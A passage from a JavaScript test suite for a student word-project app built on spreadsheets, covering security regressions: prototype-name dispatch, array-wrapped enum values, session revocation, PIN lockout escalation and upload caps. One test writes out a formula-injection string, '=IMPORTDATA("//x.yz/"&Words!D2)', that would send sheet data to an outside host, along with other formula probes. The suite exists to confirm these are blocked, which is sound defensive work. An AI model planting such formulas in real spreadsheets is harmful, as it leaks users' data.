  var ids = function (l) { return (l || []).map(function (x) { return typeof x === 'object' ? x.id : x; }); };
  var pairs = { targetGroup: 'targetGroups', idea: 'ideas', channel: 'channels', platform: 'platforms', route: 'routes', timeBudget: 'timeBudgets', pos: 'pos', formation: 'formations', outcome: 'outcomes', audience: 'audiences', journalKind: 'journalKinds', relation: 'relations', prompted: 'prompted', marked: 'marked', topic: 'topics', posUsed: 'posUsed', sightLevel: 'sightingLevels', tallyType: 'tallyTypes', evidence: 'evidenceTypes', metric: 'metrics', hypCheck: 'hypStatuses', zbPlace: 'zbPlaces', zbResult: 'zbResults', specResult: 'specResults', flagCategory: 'problemCategories', reviewDecision: 'reviewDecisions', regStatus: 'regStatuses' };
  Object.keys(pairs).forEach(function (k) {
    if (!C[pairs[k]]) return;
    assert.deepStrictEqual(S.enums[k].map(String), ids(C[pairs[k]]).map(String), k + ' vs WI_CHOICES.' + pairs[k]);
  });
  assert.strictEqual(S.strings.cropTick, env.ctx.WI_RULES.screenshotTick);
  assert.strictEqual(S.strings.notRude, env.ctx.WI_RULES.notRudeLabel);
  C.ideas.forEach(function (i) { assert.strictEqual(S.ideaMode[i.id], i.mode, i.id); });
  C.channels.forEach(function (c) { assert.strictEqual(S.onlineChannels.indexOf(c.id) >= 0, !!c.online, c.id); });
});

// ------------------------------------------- security review (19 Nov): regressions
test('review: P9 and P10 cannot be passed with an id wrapped in an array (enum values are plain strings)', function () {
  var env = fresh();
  var tok = login(env, 's01', '0001');
  ok(env.post('word.save', { fields: FIRST }, tok));
  ok(env.post('plan.save', { phase: 1, fields: CHOICES }, tok));
  var S = env.ctx.WI_SCHEMA;
  assert.strictEqual(S.enumHas('channel', ['ch_tiktok']), false);
  assert.strictEqual(S.enumHas('channel', { toString: 1 }), false);
  assert.strictEqual(S.enumHas('channel', 'ch_tiktok'), true);
  assert.strictEqual(S.enumHas('sightLevel', 4), true); assert.strictEqual(S.enumHas('sightLevel', '4'), true); assert.strictEqual(S.enumHas('sightLevel', [4]), false);
  assert.strictEqual(S.enumHas('constructor', 'x'), false);
  S.onlineChannels.forEach(function (ch) {
    bad(action(env, tok, { channelId: ch }), 'LOCKED_ONLINE', ch);
    bad(action(env, tok, { channelId: [ch] }), 'VALIDATION', 'array ' + ch);
    bad(sighting(env, tok, { channelId: [ch], relation: 'self' }), 'VALIDATION', 'sighting array ' + ch);
  });
  var af = S.askFirst[0];
  bad(action(env, tok, { ideaId: [af] }), 'VALIDATION', 'ask-first idea in an array');
  bad(env.post('plan.save', { phase: 1, fields: Object.assign({}, CHOICES, { ideas: ['id_speak', [af]] }) }, tok), 'VALIDATION', 'nested ask-first idea');
  bad(env.post('plan.save', { phase: 1, fields: Object.assign({}, CHOICES, { ideas: [['id_speak'], 'id_tiktok'] }) }, tok), 'VALIDATION');
  bad(env.post('rec.save', { type: 'planAction', record: { id: rid('pa'), where: ['ch_tiktok'], ideaId: 'id_speak', what: 'Use it at lunch with friends', why: 'They meet every day', whenDate: '2026-11-23', evidence: 'log' } }, tok), 'VALIDATION');
  assert.strictEqual(env.rows('Actions').length, 0);
  assert.strictEqual(env.rows('Sightings').length, 0);
  assert.ok(env.rows('Plans').every(function (p) { return p.ideas.indexOf(af) < 0 && p.ideas.indexOf('[[') < 0; }));
});

test('review: only listed actions are dispatched (no constructor / toString); Log never stores text from a request', function () {
  var env = fresh();
  var tok = login(env, 's01', '0001'), tt = tlogin(env);
  ['constructor', 'toString', 'valueOf', 'hasOwnProperty', '__proto__', '__defineGetter__', 'isPrototypeOf'].forEach(function (a) {
    [tok, tt, undefined].forEach(function (t) {
      var r = env.post(a, {}, t);
      assert.strictEqual(r.ok, false, a);
      assert.strictEqual(r.error.code, 'NOT_FOUND', a + ' → ' + r.error.code);
      assert.ok(JSON.stringify(r).indexOf('tokenHash') < 0);
    });
    assert.strictEqual(env.get(a).error.code, 'NOT_FOUND');
  });
  var evil = '=IMPORTDATA("//x.yz/"&Words!D2)';
  env.get(evil); env.post(evil, {}); env.post(evil, {}, tok); env.post('+1+cmd', {}, tok); env.post('@SUM(1)', {}); env.post('-2+3', {});
  env.postRaw('not json'); env.postRaw('[]'); env.postRaw(JSON.stringify({ action: { a: 1 } }));
  var S = env.ctx.WI_SCHEMA;
  env.rows('Log').forEach(function (r) {
    assert.ok(r.action === '' || r.action === '(unknown)' || r.action === 'weeklyJob' || Object.prototype.hasOwnProperty.call(S.actions, r.action), 'Log.action: ' + r.action);
    Object.keys(r).forEach(function (k) { assert.ok(!/^[=+\-@]/.test(String(r[k])) || /^-?[0-9.]+$/.test(String(r[k])), 'Log.' + k + ' could be a formula: ' + r[k]); });
  });
  assert.ok(env.rows('Log').some(function (r) { return r.action === '(unknown)' && r.errorCode === 'NOT_FOUND'; }));
  // Type names from Object.prototype are not record or report types.
  bad(env.post('rec.save', { type: 'constructor', record: { id: rid('ac') } }, tok), 'VALIDATION');
  bad(env.post('rec.delete', { type: 'constructor', id: 'x' }, tok), 'VALIDATION');
  bad(env.post('rec.delete', { type: '__proto__', id: 'x' }, tok), 'VALIDATION');
  bad(env.post('report.save', { type: 'constructor' }, tok), 'VALIDATION');
  bad(env.post('report.save', { type: '__proto__', sections: {} }, tok), 'VALIDATION');
  assert.strictEqual(env.svc._ss.getSheets().length, 26, 'no stray tab');
});

test('review: sync remembers a finished op but not a refused one (a kept op can succeed on its retry)', function () {
  var env = fresh();
  var tok = login(env, 's01', '0001'), tt = tlogin(env);
  var id = rid('ac');
  var op = { opId: 'op-online-1', action: 'rec.save', data: { type: 'action', record: { id: id, date: '2026-11-21', channelId: 'ch_tiktok', what: 'Posted a short clip with my word', outcome: 'as_planned' } } };
  var r1 = ok(env.post('sync', { ops: [op] }, tok));
  assert.strictEqual(r1.results[0].ok, false); assert.strictEqual(r1.results[0].error.code, 'LOCKED_ONLINE');
  ok(env.post('rules.tick', { ticks: [true, true, true, true, true, true] }, tok));
  ok(env.post('t.online', { studentId: 's01', unlocked: true }, tt));
  var r2 = ok(env.post('sync', { ops: [op] }, tok));
  assert.strictEqual(r2.results[0].ok, true, 'the same opId runs again after a refusal: ' + JSON.stringify(r2.results[0].error));
  assert.strictEqual(env.rows('Actions').length, 1);
  // A server fault inside one op (not a WordIdol error) is answered SERVER and must not stick either.
  var jid = rid('jn');
  var jop = { opId: 'op-fault-1', action: 'rec.save', data: { type: 'journal', record: { id: jid, date: '2026-11-21', kind: 'free', text: 'A free note with more than forty characters in it, written offline.' } } };
  var realWords = env.ctx.WI_SCHEMA.countWords, n = 0;
  env.ctx.WI_SCHEMA.countWords = function (t) { if (n++ === 0) throw new Error('Service Spreadsheets timed out'); return realWords(t); };
  var f1 = ok(env.post('sync', { ops: [jop] }, tok));
  env.ctx.WI_SCHEMA.countWords = realWords;
  assert.strictEqual(f1.results[0].ok, false); assert.strictEqual(f1.results[0].error.code, 'SERVER');
  var f2 = ok(env.post('sync', { ops: [jop] }, tok));
  assert.strictEqual(f2.results[0].ok, true, 'retry of a SERVER op runs again');
  assert.strictEqual(env.rows('Journal').length, 1);
  // A finished op is remembered: an old copy sent again does not undo a newer save.
  var newer = JSON.parse(JSON.stringify(op)); newer.opId = 'op-online-2'; newer.data.record.what = 'Posted a second, better clip with my word';
  ok(env.post('sync', { ops: [newer] }, tok));
  ok(env.post('sync', { ops: [op] }, tok));
  assert.strictEqual(env.rows('Actions')[0].what, 'Posted a second, better clip with my word');
});

test('review: a token revoked while its request waits for the lock is refused; t.pin also revokes a session made while it waited', function () {
  var env = fresh();
  var tt = tlogin(env);
  var tok = login(env, 's01', '0001');
  // (1) The teacher resets her PIN while her save is waiting for the lock.
  env.onLock = function () { ok(env.post('t.pin', { studentId: 's01', newPin: '4321' }, tt)); };
  bad(env.post('rec.save', { type: 'tally', record: { id: rid('tl'), date: '2026-11-21', tallyType: 'said', count: 1 } }, tok), 'AUTH_REQUIRED', 'revoked while waiting');
  assert.strictEqual(env.rows('Tallies').length, 0);
  // (2) She signs in on a second device while the teacher's PIN reset is waiting for the lock.
  var late = null;
  env.onLock = function () { late = login(env, 's01', '4321'); };
  ok(env.post('t.pin', { studentId: 's01', newPin: '5678' }, tt));
  assert.ok(late);
  bad(env.post('bootstrap', {}, late), 'AUTH_REQUIRED', 'the session made during the wait is revoked too');
  assert.ok(env.rows('Sessions').filter(function (s) { return s.who === 's01'; }).every(function (s) { return s.revoked === 'TRUE'; }));
  // (3) A guest purge (rows deleted, row numbers move) while a student request waits: no session row is damaged.
  var a = login(env, 's02', '0002'), g = login(env, 'g1', '1111'), b = login(env, 's03', '0003');
  env.advance(2 * 3600000); // so the waiting request refreshes lastSeenAt (a Sessions write)
  tt = tlogin(env);
  env.onLock = function () { ok(env.post('t.purgeGuests', { confirm: 'PURGE' }, tt)); };
  ok(env.post('bootstrap', {}, b));
  ok(env.post('bootstrap', {}, a)); ok(env.post('bootstrap', {}, b)); ok(env.post('t.overview', {}, tt));
  bad(env.post('bootstrap', {}, g), 'AUTH_REQUIRED');
  var hashes = env.rows('Sessions').map(function (s) { return s.tokenHash; });
  assert.strictEqual(hashes.length, Object.keys(hashes.reduce(function (o, h) { o[h] = 1; return o; }, {})).length, 'no duplicated session row');
});

test('review: lockouts double (5, 10, 20 … minutes, at most 6 hours); the owner signing in does not reset them; a quiet day or t.pin does', function () {
  var env = fresh();
  var L = env.ctx.WI_SCHEMA.limits;
  function lockOnce(id) {
    var e = null;
    for (var i = 0; i < 5; i++) { var r = env.post('login', { studentId: id, pin: '9999' }); assert.strictEqual(r.ok, false); e = r.error; if (i < 4) assert.strictEqual(e.code, 'AUTH_BAD_PIN', id + ' try ' + i + ': ' + e.code); }
    assert.strictEqual(e.code, 'AUTH_LOCKED');
    return Math.round((Date.parse(e.data.retryAt) - env.t) / 60000);
  }
  assert.strictEqual(lockOnce('s01'), 5);
  // Locked means locked: other spellings of the id, parallel tries and the teacher door do not help.
  bad(env.post('login', { studentId: ' s01 ', pin: '0001' }), 'AUTH_LOCKED');
  bad(env.post('login', { studentId: 'S01', pin: '0001' }), 'VALIDATION');
  bad(env.post('t.login', { pin: '0001' }), 'AUTH_BAD_PIN');
  env.onLock = function () { bad(env.post('login', { studentId: 's01', pin: '0001' }), 'AUTH_LOCKED'); };
  bad(env.post('login', { studentId: 's01', pin: '0001' }), 'AUTH_LOCKED');
  ok(env.post('login', { studentId: 's02', pin: '0002' }), 'another id is not locked');
  assert.ok(JSON.parse(env.svc._props['lock.s01']).until > env.t, 'lock state is a Script Property for that id');
  assert.ok(!env.svc._props['lock.s02']);
  env.advance(5 * 60000 + 1000);
  assert.strictEqual(lockOnce('s01'), 10);
  env.advance(10 * 60000 + 1000);
  var tok = login(env, 's01', '0001'); // the owner signs in between two attacks
  ok(env.post('bootstrap', {}, tok));
  assert.strictEqual(lockOnce('s01'), 20, 'a correct PIN clears the wrong-PIN count, not the lockout streak');
  ok(env.post('bootstrap', {}, tok)); // a lock does not sign her out
  var mins = [];
  for (var k = 0; k < 9; k++) { env.advance((mins.length ? mins[mins.length - 1] : 20) * 60000 + 1000); mins.push(lockOnce('s01')); }
  assert.deepStrictEqual(mins, [40, 80, 160, 320, 360, 360, 360, 360, 360]);
  assert.strictEqual(L.lockoutStudentMaxMin, 360);
  // Guess rate once the cap is reached: 5 tries per 6 hours, so 10,000 PINs need more than a year.
  assert.ok(10000 / (5 * 24 * 60 / L.lockoutStudentMaxMin) > 365);
  // The teacher's PIN reset clears the lock at once.
  var tt = tlogin(env);
  ok(env.post('t.pin', { studentId: 's01', newPin: '2468' }, tt));
  ok(env.post('login', { studentId: 's01', pin: '2468' }));
  assert.strictEqual(lockOnce('s01'), 5);
  // A quiet day brings the next lockout back to 5 minutes.
  assert.strictEqual(lockOnce('s03'), 5);
  env.advance(5 * 60000 + L.lockoutEscalateHours * 3600000 + 1000);
  assert.strictEqual(lockOnce('s03'), 5);
  // The teacher's lockout stays 15 minutes.
  for (var t = 0; t < 2; t++) {
    var e = null; for (var i = 0; i < 5; i++) e = env.post('t.login', { pin: '000000' }).error;
    assert.strictEqual(e.code, 'AUTH_LOCKED'); assert.strictEqual(Math.round((Date.parse(e.data.retryAt) - env.t) / 60000), 15);
    env.advance(15 * 60000 + 1000);
  }
  // Nothing secret in the lock or PIN properties.
  Object.keys(env.svc._props).forEach(function (k) { assert.ok(!/2468|0001|123456/.test(env.svc._props[k]) || /^[0-9a-f]{64}$/.test(env.svc._props[k]) || k.indexOf('lock.') === 0 && !/"(2468|0001|123456)"/.test(env.svc._props[k]), k); });
});

test('review: an expired audit no longer shows the classmate’s sightings', function () {
  var env = fresh('2026-12-01T10:00:00+07:00');
  var tt = tlogin(env);
  ok(env.post('t.config.save', { key: 'release', value: 2 }, tt));
  var toks = {};
  ['s01', 's02', 's03'].forEach(function (id, i) {
    toks[id] = login(env, id, '000' + (i + 1));
    for (var k = 0; k < 3; k++) ok(sighting(env, toks[id], { date: '2026-11-' + (24 + k) }));
  });
  env.setNow('2026-12-03T10:00:00+07:00');
  tt = tlogin(env);
  assert.strictEqual(ok(env.post('t.job.run', {}, tt)).audits, 3);
  var mine = ok(env.post('bootstrap', {}, toks.s02)).audits.mine[0];
  assert.strictEqual(mine.status, 'assigned'); assert.ok(mine.sightings.length >= 1);
  env.setNow('2026-12-07T00:10:00+07:00'); // the Monday after the due Sunday
  env.ctx.weeklyJob();
  var after = ok(env.post('bootstrap', {}, toks.s02)).audits.mine[0];
  assert.strictEqual(after.status, 'expired');
  assert.deepStrictEqual(after.sightings, []);
  var verdicts = {}; mine.sightings.forEach(function (s) { verdicts[s.id] = { verdict: 'agree' }; });
  bad(env.post('audit.submit', { auditId: mine.id, verdicts: verdicts }, toks.s02), 'VALIDATION');
  // Nobody else's audit can be opened or answered by id.
  var other = env.rows('Audits').filter(function (a) { return a.auditorId !== 's02'; })[0];
  bad(env.post('audit.submit', { auditId: other.id, verdicts: {} }, toks.s02), 'FORBIDDEN');
});

test('review: at most 100 uploads a day for one student, deleted ones included (upload-and-delete loop)', function () {
  var env = fresh();
  var tok = login(env, 's01', '0001');
  var cap = env.ctx.WI_SCHEMA.limits.uploadsPerDay;
  assert.strictEqual(cap, 100);
  for (var i = 0; i < cap; i++) {
    var f = ok(upload(env, tok, {}, 1200, i + 1), 'upload ' + i).file;
    if (i % 2) ok(env.post('file.delete', { id: f.id }, tok));
    if (i % 20 === 19) env.advance(61000); // stay under the rate limit
  }
  var e = bad(upload(env, tok, {}, 1200, 5000), 'LIMIT');
  assert.ok(/today/.test(e.message));
  ok(upload(env, login(env, 's02', '0002'), {}, 1200, 5001), 'another student is not affected');
  env.advance(86400000);
  ok(upload(env, tok, {}, 1200, 5002), 'the next day');
});

test('review: a date-time without a zone is read as Bangkok time; long ids in packs are cut', function () {
  var env = fresh();
  var c = env.ctx;
  assert.strictEqual(c.ms_('2026-11-26T16:30:00'), Date.parse('2026-11-26T16:30:00+07:00'));
  assert.strictEqual(c.ms_('2026-11-26 16:30'), Date.parse('2026-11-26T16:30:00+07:00'));
  assert.strictEqual(c.ms_('2026-11-26'), Date.parse('2026-11-26T00:00:00+07:00'));
  assert.strictEqual(c.ms_('2026-11-26T09:30:00Z'), Date.parse('2026-11-26T16:30:00+07:00'));
  var tt = tlogin(env), tok = login(env, 's01', '0001');
  ok(env.post('t.config.save', { key: 'onlineOpensAt', value: '2026-11-26T16:30:00' }, tt));
  assert.strictEqual(ok(env.post('bootstrap', {}, tok)).config.onlineOpensAt, '2026-11-26T16:30:00+07:00');
  ok(env.post('t.config.save', { key: 'release', value: 3 }, tt));
  bad(env.post('summit.save', { patch: { rehearsals: [{ at: 'x'.repeat(5000), talkSec: 400 }] } }, tok), 'VALIDATION');
  ok(env.post('summit.save', { patch: { rehearsals: [{ at: '2026-12-10T18:00:00+07:00', talkSec: 400, qaSec: 100 }] } }, tok));
  var art = ok(env.post('article.save', { patch: { sources: [{ id: 'y'.repeat(9000), apa: 'Author, A. (2020). A long enough title. Publisher.', type: 'book', use: 'Background for my method.' }] } }, tok)).article;
  assert.strictEqual(art.sources[0].id.length, 20);
});

// ------------------------------------------------------------------- report
var failed = results.filter(function (r) { return !r.ok; });
results.forEach(function (r) {
  process.stdout.write((r.ok ? 'ok   ' : 'FAIL ') + r.name + '\n');
  if (!r.ok) process.stdout.write('     ' + String(r.err && r.err.stack || r.err).split('\n').slice(0, 4).join('\n     ') + '\n');
});
process.stdout.write('\n' + (results.length - failed.length) + ' of ' + results.length + ' API tests passed' + (USE_SOURCES ? ' (source files)' : '') + '\n');
process.exit(failed.length ? 1 : 0);
